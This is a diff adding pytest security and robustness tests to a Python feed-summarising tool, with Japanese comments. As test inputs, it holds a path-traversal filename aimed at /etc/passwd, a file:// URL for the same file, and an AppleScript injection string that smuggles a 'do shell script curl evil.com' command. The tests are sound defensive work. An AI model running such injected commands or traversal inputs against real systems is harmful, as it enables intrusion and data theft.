@@ -19,6 +19,118 @@ def test_sanitize_filename_removes_invalid():
     assert main.sanitize_filename('inva*lid:"name?') == "invalidname"
 
 
+def test_sanitize_filename_removes_path_traversal():
+    """../を含むファイル名がディレクトリトラバーサルしないこと"""
+    import main
+
+    assert "/" not in main.sanitize_filename("../../../etc/passwd")
+    assert ".." not in main.sanitize_filename("../../../etc/passwd")
+    # 結果が安全なファイル名であること
+    result = main.sanitize_filename("..%2F..%2Fetc/passwd")
+    assert ".." not in result
+
+
+def test_sanitize_filename_dotdot_only():
+    """ファイル名が .. のみの場合も安全であること"""
+    import main
+
+    result = main.sanitize_filename("..")
+    assert result != ".."
+    assert ".." not in result
+
+
+def test_notify_escapes_double_quotes(monkeypatch):
+    """notify() が " を含むメッセージで AppleScript インジェクションしないこと"""
+    import importlib
+
+    monkeypatch.setenv("GEMINI_API_KEY", "test-key")
+    import main
+
+    main = importlib.reload(main)
+
+    # pync を無効化して osascript パスに入る
+    monkeypatch.setattr(main, "_USE_PYNC", False)
+
+    captured = {}
+
+    def fake_run(args):
+        captured["args"] = args
+
+    monkeypatch.setattr(main.subprocess, "run", fake_run)
+
+    # ダブルクォートを含むメッセージ
+    main.notify('test" & do shell script "curl evil.com', title="My Title")
+
+    # osascript に渡される文字列にエスケープされていない " が含まれないこと
+    script = captured["args"][2]
+    # display notification と with title の中身だけにクォートがあるべき
+    # エスケープされた \" は安全
+    # 未エスケープの " が display notification "..." with title "..." 以外に無いことを確認
+    assert '" & do shell script "' not in script
+
+
+def test_notify_escapes_backslash_in_title(monkeypatch):
+    """notify() が title に " を含む場合も安全であること"""
+    import importlib
+
+    monkeypatch.setenv("GEMINI_API_KEY", "test-key")
+    import main
+
+    main = importlib.reload(main)
+
+    monkeypatch.setattr(main, "_USE_PYNC", False)
+
+    captured = {}
+
+    def fake_run(args):
+        captured["args"] = args
+
+    monkeypatch.setattr(main.subprocess, "run", fake_run)
+
+    main.notify("hello", title='Evil"Title')
+
+    script = captured["args"][2]
+    # title 内の " がエスケープされていること
+    assert 'Evil"Title' not in script
+
+
+def test_crawl_skips_non_http_feed_url(monkeypatch, tmp_path):
+    """file:// スキームの URL がスキップされること"""
+    import importlib
+
+    monkeypatch.setenv("GEMINI_API_KEY", "test-key")
+    monkeypatch.setenv("OUTPUT_DIR_YT", str(tmp_path / "yt"))
+    monkeypatch.setenv("OUTPUT_DIR_POD", str(tmp_path / "pod"))
+
+    import main
+
+    main = importlib.reload(main)
+
+    # feedparser.parse が呼ばれた URL を記録
+    parse_calls = []
+
+    def fake_parse(url):
+        parse_calls.append(url)
+        return type("P", (), {"entries": []})()
+
+    monkeypatch.setattr(main.feedparser, "parse", fake_parse)
+
+    # file:// URL を含む feeds.yaml を用意
+    feeds_content = '- "file:///etc/passwd"\n- "https://example.com/feed"\n'
+    monkeypatch.setattr(
+        main.yaml, "safe_load", lambda _text: ["file:///etc/passwd", "https://example.com/feed"]
+    )
+    monkeypatch.setattr(main.pathlib.Path, "read_text", lambda self: feeds_content)
+
+    main.crawl()
+
+    # file:// URL は feedparser.parse に渡されないこと
+    for url in parse_calls:
+        assert not url.startswith("file://"), f"file:// URL がパースされた: {url}"
+    # https URL はパースされていること
+    assert any(url.startswith("https://") for url in parse_calls)
+
+
 def test_yt_is_video_filters_shorts_and_live():
     import main
 
@@ -226,6 +338,78 @@ def test_process_podcast_skips_when_no_summary(monkeypatch, tmp_path):
 
     main.process_podcast(entry)
     out_files = list((tmp_path / "pod").glob("*.md"))
+    assert out_files == []
+
+
+def test_process_youtube_skips_on_download_failure(monkeypatch, tmp_path):
+    """yt-dlp ダウンロード失敗時にクラッシュせずスキップすること"""
+    import importlib
+
+    monkeypatch.setenv("OUTPUT_DIR_YT", str(tmp_path / "yt"))
+    monkeypatch.setenv("OUTPUT_DIR_POD", str(tmp_path / "pod"))
+
+    import main
+
+    main = importlib.reload(main)
+
+    monkeypatch.setattr(main, "yt_meta", lambda url: {"duration": 120})
+    monkeypatch.setattr(main, "notify", lambda *_a, **_k: None)
+
+    def fake_run_fail(args, check, timeout):
+        raise main.subprocess.CalledProcessError(1, args)
+
+    monkeypatch.setattr(main.subprocess, "run", fake_run_fail)
+
+    entry = SimpleNamespace(
+        yt_videoid="vid_fail",
+        title="Failing Video",
+        pub_dash="2025-12-17",
+        pub_slash="2025/12/17",
+        author="Author",
+        link="https://youtu.be/vid_fail",
+    )
+
+    # クラッシュせず正常に return すること
+    main.process_youtube(entry)
+
+    # Markdown が出力されていないこと
+    out_files = list((tmp_path / "yt").glob("*.md"))
+    assert out_files == []
+
+
+def test_process_youtube_skips_on_timeout(monkeypatch, tmp_path):
+    """yt-dlp タイムアウト時にクラッシュせずスキップすること"""
+    import importlib
+
+    monkeypatch.setenv("OUTPUT_DIR_YT", str(tmp_path / "yt"))
+    monkeypatch.setenv("OUTPUT_DIR_POD", str(tmp_path / "pod"))
+
+    import main
+
+    main = importlib.reload(main)
+
+    monkeypatch.setattr(main, "yt_meta", lambda url: {"duration": 120})
+    monkeypatch.setattr(main, "notify", lambda *_a, **_k: None)
+
+    def fake_run_timeout(args, check, timeout):
+        raise main.subprocess.TimeoutExpired(args, timeout)
+
+    monkeypatch.setattr(main.subprocess, "run", fake_run_timeout)
+
+    entry = SimpleNamespace(
+        yt_videoid="vid_timeout",
+        title="Timeout Video",
+        pub_dash="2025-12-17",
+        pub_slash="2025/12/17",
+        author="Author",
+        link="https://youtu.be/vid_timeout",
+    )
+
+    # クラッシュせず正常に return すること
+    main.process_youtube(entry)
+
+    # Markdown が出力されていないこと
+    out_files = list((tmp_path / "yt").glob("*.md"))
     assert out_files == []
 
 
